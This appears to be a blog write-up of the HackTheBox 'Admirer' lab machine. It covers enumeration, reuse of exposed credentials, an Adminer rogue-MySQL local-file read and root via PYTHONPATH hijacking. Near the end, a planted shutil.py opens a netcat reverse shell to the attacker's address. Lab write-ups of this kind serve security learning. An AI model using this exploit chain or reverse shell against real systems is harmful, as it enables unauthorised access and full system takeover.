---
date: 2020-09-26 23:48:05
layout: post
title: HackTheBox Admirer Writeup
subtitle: Hackthebox Admirer Writeup.
description: >-
  in this blog i've explained how to solve Admirer machine in hackthebox
image: https://i.ibb.co/VmGJygH/logo.png
optimized_image: https://i.ibb.co/VmGJygH/logo.png
category: hackthebox
tags:
  - hackthebox
  - Admirer
author: Ahmed Fatouh
paginate: true
---

# []()Methodology

* Nmap Scan
* Gobuster lead to **admin-dir** from robots.txt file
* find files which contains **ftp credentials**
* download files from ftp
* Gobuster in another dir give us **adminer.php**.
* Adminer DB Exploit lead to read local files.
* Got User
* PYTHONPATH Hijacking 
* Got Root.
* Let's go!

# []() Nmap Scan

* as always, i’ll do nmap scan to find out which services running in this machine, in this machine i found 3 opened ports.
* 22 --> ssh
* 21 --> ftp
* 80 --> http

> **nmap -sC -sV -Pn -oN scan.txt 10.10.10.187**

```ruby

Nmap scan report for 10.10.10.187
Host is up (0.27s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE    VERSION
21/tcp open  ftp        vsftpd 3.0.3
22/tcp open  ssh        OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)
80/tcp open  tcpwrapped
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel


```

* now let's Check the webpage and run Gobuster againest this machine.

# []() Web-Page

* the webpage had nothing.

![](https://i.ibb.co/1fGyRBY/webpage.png)

* let's run gobuster now.

> **gobuster dir -u http://10.10.10.187/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,php,html -s 200,301**

```ruby

╭─xdev05@nic3One ~/Documents/HTB/Admirer  
╰─➤  gobuster dir -u http://10.10.10.187/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,php,html -s 200,301
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.187/
[+] Threads:        10
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes:   200,301
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,php,html
[+] Timeout:        10s
===============================================================
2020/09/24 20:44:34 Starting gobuster
===============================================================
/images (Status: 301)
/index.php (Status: 200)
/assets (Status: 301)
/robots.txt (Status: 200)

```

* let's open robots.txt now.

![](https://i.ibb.co/Yjb6w3f/robots.png)

* admin-dir dissallowd okay!, but what if we open another directory on admin-dir like **admin-dir/any.txt**.

* let's run Gobuster againest this dir.

> **gobuster dir -u http://10.10.10.187/admin-dir -w /usr/share/dirb/wordlists/big.txt -x txt,php,html -s 200,301**

```ruby

╭─xdev05@nic3One ~/Documents/HTB/Admirer  
╰─➤  gobuster dir -u http://10.10.10.187/admin-dir -w /usr/share/dirb/wordlists/big.txt -x txt,php,html -s 200,301 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.187/admin-dir
[+] Threads:        10
[+] Wordlist:       /usr/share/dirb/wordlists/big.txt
[+] Status codes:   200,301
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,php,html
[+] Timeout:        10s
===============================================================
2020/09/24 20:50:36 Starting gobuster
===============================================================
/contacts.txt (Status: 200)
/credentials.txt (Status: 200)

```

* nice!, let's check what these files contain.

![](https://i.ibb.co/FY8vyfC/credentials.png)

![](https://i.ibb.co/TbvSxFS/contacts.png)

* nice, now we have **ftp Credentials** let's login and check if there any files.

> **ftp 10.10.10.187** , User:**ftpuser**, Password:**%n?4Wz}R$tTF7**

![](https://i.ibb.co/Tv9gJHk/ftp.png)

* Download these files.

* let's checl dump.sql file.

```ruby

╭─xdev05@nic3One ~/Documents/HTB/Admirer  
╰─➤  cat dump.sql 
-- MySQL dump 10.16  Distrib 10.1.41-MariaDB, for debian-linux-gnu (x86_64)
--
-- Host: localhost    Database: admirerdb
-- ------------------------------------------------------
-- Server version	10.1.41-MariaDB-0+deb9u1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `items`
--

DROP TABLE IF EXISTS `items`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `items` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `thumb_path` text NOT NULL,
  `image_path` text NOT NULL,
  `title` text NOT NULL,
  `text` text,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=13 DEFAULT CHARSET=utf8mb4;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `items`
--

LOCK TABLES `items` WRITE;
/*!40000 ALTER TABLE `items` DISABLE KEYS */;
INSERT INTO `items` VALUES (1,'images/thumbs/thmb_art01.jpg','images/fulls/art01.jpg','Visual Art','A pure showcase of skill and emotion.'),(2,'images/thumbs/thmb_eng02.jpg','images/fulls/eng02.jpg','The Beauty and the Beast','Besides the technology, there is also the eye candy...'),(3,'images/thumbs/thmb_nat01.jpg','images/fulls/nat01.jpg','The uncontrollable lightshow','When the sun decides to play at night.'),(4,'images/thumbs/thmb_arch02.jpg','images/fulls/arch02.jpg','Nearly Monochromatic','One could simply spend hours looking at this indoor square.'),(5,'images/thumbs/thmb_mind01.jpg','images/fulls/mind01.jpg','Way ahead of his time','You probably still use some of his inventions... 500yrs later.'),(6,'images/thumbs/thmb_mus02.jpg','images/fulls/mus02.jpg','The outcomes of complexity','Seriously, listen to Dust in Interstellar\'s OST. Thank me later.'),(7,'images/thumbs/thmb_arch01.jpg','images/fulls/arch01.jpg','Back to basics','And centuries later, we want to go back and live in nature... Sort of.'),(8,'images/thumbs/thmb_mind02.jpg','images/fulls/mind02.jpg','We need him back','He might have been a loner who allegedly slept with a pigeon, but that brain...'),(9,'images/thumbs/thmb_eng01.jpg','images/fulls/eng01.jpg','In the name of Science','Some theories need to be proven.'),(10,'images/thumbs/thmb_mus01.jpg','images/fulls/mus01.jpg','Equal Temperament','Because without him, music would not exist (as we know it today).');
/*!40000 ALTER TABLE `items` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2019-12-02 20:24:15


```

* nothing here.

* let's decompress the html file and check it.

* now we have 4 files from the compressed file.

1. utility-scripts
2. w4ld0s_s3cr3t_d1r
3. images
4. assets

* listen, all the passwords in these files are rabbit holes.

* now open the **utility-scripts** folder.

```
╭─xdev05@nic3One ~/Documents/HTB/Admirer/utility-scripts  
╰─➤  ls -la
total 24
drwxrwxrwx 2 xdev05 xdev05 4096 Aug  7 06:44 .
drwxrwxrwx 7 xdev05 xdev05 4096 Sep 24 20:25 ..
-rwxrwxrwx 1 xdev05 xdev05 1795 Dec  2  2019 admin_tasks.php
-rwxrwxrwx 1 xdev05 xdev05  401 Dec  1  2019 db_admin.php
-rwxrwxrwx 1 xdev05 xdev05   20 Nov 29  2019 info.php
-rwxrwxrwx 1 xdev05 xdev05   53 Dec  2  2019 phptest.php

```

> **admin_tasks.php**

```ruby

<html>
<head>
  <title>Administrative Tasks</title>
</head>
<body>
  <h3>Admin Tasks Web Interface (v0.01 beta)</h3>
  <?php
  // Web Interface to the admin_tasks script
  // 
  if(isset($_REQUEST['task']))
  {
    $task = $_REQUEST['task'];
    if($task == '1' || $task == '2' || $task == '3' || $task == '4' ||
       $task == '5' || $task == '6' || $task == '7')
    {
      /*********************************************************************************** 
         Available options:
           1) View system uptime
           2) View logged in users
           3) View crontab (current user only)
           4) Backup passwd file (not working)
           5) Backup shadow file (not working)
           6) Backup web data (not working)
           7) Backup database (not working)

           NOTE: Options 4-7 are currently NOT working because they need root privileges.
                 I'm leaving them in the valid tasks in case I figure out a way
                 to securely run code as root from a PHP page.
      ************************************************************************************/
      echo str_replace("\n", "<br />", shell_exec("/opt/scripts/admin_tasks.sh $task 2>&1"));
    }
    else
    {
      echo("Invalid task.");
    }
  } 
  ?>

  <p>
  <h4>Select task:</p>
  <form method="POST">
    <select name="task">
      <option value=1>View system uptime</option>
      <option value=2>View logged in users</option>
      <option value=3>View crontab</option>
      <option value=4 disabled>Backup passwd file</option>
      <option value=5 disabled>Backup shadow file</option>
      <option value=6 disabled>Backup web data</option>
      <option value=7 disabled>Backup database</option>
    </select>
    <input type="submit">
  </form>
</body>
</html>

```

> **db_admin.php**

```ruby

<?php
  $servername = "localhost";
  $username = "waldo";
  $password = "Wh3r3_1s_w4ld0?";

  // Create connection
  $conn = new mysqli($servername, $username, $password);

  // Check connection
  if ($conn->connect_error) {
      die("Connection failed: " . $conn->connect_error);
  }
  echo "Connected successfully";


  // TODO: Finish implementing this or find a better open source alternative
?>

```

> **info.php**

```ruby

<?php phpinfo(); ?>

```

> **phptest.php**

```ruby

<?php
  echo("Just a test to see if PHP works.");
?>

```

* as i told you bro, all of this is a rabbit hole.

* let's check the utility-scripts web page.

![](https://i.ibb.co/hsxRTCJ/utility.png)

> here we can't access this page but we can access any file in this dir.

![](https://i.ibb.co/hcmrn2r/admin-task.png)

* so now let's run Gobuster againest this dir too.

> **gobuster dir -u http://10.10.10.187/utility-scripts/ -w /usr/share/dirb/wordlists/big.txt -s 200,301 -x txt,php,html**

```ruby

╭─xdev05@nic3One ~/Documents/HTB/Admirer  
╰─➤  gobuster dir -u http://10.10.10.187/utility-scripts/ -w /usr/share/dirb/wordlists/big.txt -s 200,301 -x txt,php,html
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.187/utility-scripts/
[+] Threads:        10
[+] Wordlist:       /usr/share/dirb/wordlists/big.txt
[+] Status codes:   200,301
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,html,txt
[+] Timeout:        10s
===============================================================
2020/09/24 21:19:34 Starting gobuster
===============================================================
/adminer.php (Status: 200)

```

* here we go, this is a Adminer DB Manager.

![](https://i.ibb.co/HpDB9Vr/adminer.png)

* i tried to login with common passwords and users but i failed 

* after searching about adminer db manager exploits i find this [Blog](https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool) 

* how does this vuln work? 

1. First, the attacker will access the victim’s Adminer instance, but instead of trying to connect to the
victim’s MySQL database, they connect “back” to their own MySQL database hosted on their own server.

2. Second, using the victim’s Adminer (connected to their own database) – they use the MySQL command
‘LOAD DATA LOCAL’, specifying a local file on the victim’s server.

* so now let's configure our database.

# []() MySql Configuration

> read these Blogs [Blog 1](https://docs.rackspace.com/support/how-to/install-mysql-server-on-the-ubuntu-operating-system/) - [Blog 2](https://www.digitalocean.com/community/tutorials/how-to-allow-remote-access-to-mysql)

* now let's go

* login to your database first.

> **MariaDB [(none)]> CREATE DATABASE test;**

* and then create a user and give it all privileges to access the database.

> **MariaDB [(none)]> INSERT INTO mysql.user (User,Host,authentication_string,ssl_cipher,x509_issuer,x509_subject)
    -> VALUES('demo','%',PASSWORD('demopassword'),'','','');**
    
> **MariaDB [(none)]> FLUSH PRIVILEGES;**

* and now i selected the db test and give the user all privileges for the database.

> **MariaDB [admirer]> GRANT ALL PRIVILEGES ON *.* TO 'demo'@'%';**

* and create a table name demo here.

> **create table demo(data VARCHAR(255));**

* now go to this file **/etc/mysql/mariadb.conf.d/50-server.cnf** and set the bind address to **0.0.0.0**

* we are done now and we can login.

![](https://i.ibb.co/YcdvsyP/logged-in.png)

* now go to sql command section to run commands.

![](https://i.ibb.co/kQGSRsB/sql-commands.png)

* from the blog we know that we can read the local files of the server which the Adminer uploaded at.

* write these commands to load **local.xml**

```ruby

load data local infile 'app/data/local.xml'
into table demo
fields terminated by "/n"

```

![](https://i.ibb.co/7bd2LmY/local.png)

* there is no file called **local.xml**

* let's read the **index.php**

![](https://i.ibb.co/Vt0JMZX/index-php.png)

* we run the query successfully.

* click on select to get the table content.

![](https://i.ibb.co/sgJzSx1/waldo.png)

> Username:**waldo**, Password:**&<h5b~yK3F#{PaPB&dA}{H>**

* login with ssh.

> **ssh waldo@10.10.10.187**

```ruby

╭─xdev05@nic3One ~/Documents/HTB/Admirer  
╰─➤  ssh waldo@10.10.10.187
waldo@10.10.10.187's password: 
Linux admirer 4.9.0-12-amd64 x86_64 GNU/Linux

The programs included with the Devuan GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
Last login: Wed Apr 29 10:56:59 2020 from 10.10.14.3
waldo@admirer:~$ cat user.txt 
e5ebe873c73905d26f...............fa39
waldo@admirer:~$ 

```

# []() Privilege Escalation

* just run **sudo -l**

```ruby
waldo@admirer:~$ sudo -l 
[sudo] password for waldo: 
Matching Defaults entries for waldo on admirer:
    env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, listpw=always

User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
waldo@admirer:~$ 

```

* let's check these scripts

> **admin_tasls.sh**

```ruby
#!/bin/bash

view_uptime()
{
    /usr/bin/uptime -p
}

view_users()
{
    /usr/bin/w
}

view_crontab()
{
    /usr/bin/crontab -l
}

backup_passwd()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Backing up /etc/passwd to /var/backups/passwd.bak..."
        /bin/cp /etc/passwd /var/backups/passwd.bak
        /bin/chown root:root /var/backups/passwd.bak
        /bin/chmod 600 /var/backups/passwd.bak
        echo "Done."
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_shadow()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Backing up /etc/shadow to /var/backups/shadow.bak..."
        /bin/cp /etc/shadow /var/backups/shadow.bak
        /bin/chown root:shadow /var/backups/shadow.bak
        /bin/chmod 600 /var/backups/shadow.bak
        echo "Done."
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_web()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running backup script in the background, it might take a while..."
        /opt/scripts/backup.py &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_db()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running mysqldump in the background, it may take a while..."
        #/usr/bin/mysqldump -u root admirerdb > /srv/ftp/dump.sql &
        /usr/bin/mysqldump -u root admirerdb > /var/backups/dump.sql &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}



# Non-interactive way, to be used by the web interface
if [ $# -eq 1 ]
then
    option=$1
    case $option in
        1) view_uptime ;;
        2) view_users ;;
        3) view_crontab ;;
        4) backup_passwd ;;
        5) backup_shadow ;;
        6) backup_web ;;
        7) backup_db ;;

        *) echo "Unknown option." >&2
    esac

    exit 0
fi


# Interactive way, to be called from the command line
options=("View system uptime"
         "View logged in users"
         "View crontab"
         "Backup passwd file"
         "Backup shadow file"
         "Backup web data"
         "Backup DB"
         "Quit")

echo
echo "[[[ System Administration Menu ]]]"
PS3="Choose an option: "
COLUMNS=11
select opt in "${options[@]}"; do
    case $REPLY in
        1) view_uptime ; break ;;
        2) view_users ; break ;;
        3) view_crontab ; break ;;
        4) backup_passwd ; break ;;
        5) backup_shadow ; break ;;
        6) backup_web ; break ;;
        7) backup_db ; break ;;
        8) echo "Bye!" ; break ;;

        *) echo "Unknown option." >&2
    esac
done

exit 0

```
* there is function called **backup_web()** which is running a file called **backup.py** 

* **backup.py**

```ruby
waldo@admirer:/opt/scripts$ cat backup.py 
#!/usr/bin/python3

from shutil import make_archive

src = '/var/www/html/'

# old ftp directory, not used anymore
#dst = '/srv/ftp/html'

dst = '/var/backups/html'

make_archive(dst, 'gztar', src)

```

> **Its using the module shutil and there is a function call of function make_archive.**

# []() PYTHONPATH Hijacking

* first i find these Blogs [Blog 1](https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8), [Blog 2](https://medium.com/@klockw3rk/privilege-escalation-hijacking-python-library-2a0e92a45ca7) and its helped me.

* now we know that we can run the admin_tasks script as root, and we can set the path as root, so i will create a reverse shell and set the PYTHONPATH to the dir of my reverse shell.

* let's go

* **go to /tmp/ and create a shutil.py which will contain my reverse shell.**

> **shutil.py**

```ruby
import os
def make_archive(dst, gzta, src):
        os.system("nc 10.10.16.34 1234 -e /bin/sh")

```

* now let's set the pythonPath to my reverse shell dir and run the admin_tasks script.

> **sudo PYTHONPATH=/tmp /opt/scripts/admin_tasks.sh**

* choose the option 6.

> note: when we set the PYTHONPATH to my reverse shell dir which is **shutil.py** script the backup.py will find the shutil.py in this path and run it instead of the real shutil.py 

![](https://i.ibb.co/tmY7B5j/rooted.png)

* Thanks For Reading.

* Cheers!

<script src="https://www.hackthebox.eu/badge/103789"></script>

